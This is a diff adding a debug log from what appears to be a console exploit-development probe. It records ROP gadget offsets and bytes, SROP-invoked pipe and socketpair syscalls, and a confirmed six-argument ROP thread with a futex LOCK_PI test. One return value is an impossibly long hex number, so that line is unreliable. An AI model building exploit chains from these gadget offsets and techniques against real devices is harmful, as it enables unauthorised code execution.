@@ -1,0 +1,37 @@
+=== PROBE 142o: VERIFY+PIPE ===
+pid=570
+gpu=0x00000003116F4000
+sc_addr=0x000000083EF2CB5A
+eboot=0x000000003F900000
+
+--- [A] Verify gadgets ---
+[A] ret at +0x42: C3 08 4C 39
+[A] pop_rax;ret at +0x992: 58 C3 90 90
+[A] pop_rsi;ret at +0xD77D: 5E C3 C5 FA
+[A] pop_rdi;ret at +0xC9DFE: 5F C3 48 83
+[A] pop_rcx;ret at +0xE64: 59 C3 C5 D2
+[A] mov[rdi],eax;ret at +0x92C68: 89 07 C3 90
+[A] mov[rdi],rax;ret at +0xD0B60: 48 89 07 C3
+[A] pop_rdx;ret at +0x420E6D: 5A C3 FF 51 
+[A] *** pop_rdx;ret CONFIRMED! ***
+
+--- [B] pipe via SROP ---
+[B] pipe ret=0x0000000000000016 fd0=57005 fd1=57005
+[B] pipe2 ret=0xFFFFFFFFFFFFFFFFFFFFFFFF fd0=57005 fd1=57005
+
+--- [C] socketpair via SROP ---
+[C] socketpair ret=0x0000000000000000 fd0=24 fd1=25
+[C] *** SOCKETPAIR WORKS! ***
+
+--- [D] SKIPPED: no working pipe ---
+
+--- [E] Thread with pop_rdx ---
+[E] Creating thread with pop_rdx in ROP...
+[E] ok=true rv=0x0 tid=101539
+[E] thr_kill=0x0000000000000000 (0=alive)
+[E] *** THREAD WITH pop_rdx IS ALIVE! ***
+[E] futex=1 (expect non-zero if LOCK_PI worked)
+[E] *** LOCK_PI WITH pop_rdx CONFIRMED! val=1 ***
+[E] *** FULL 6-ARG THREAD ROP CONFIRMED! ***
+
+=== DONE ===
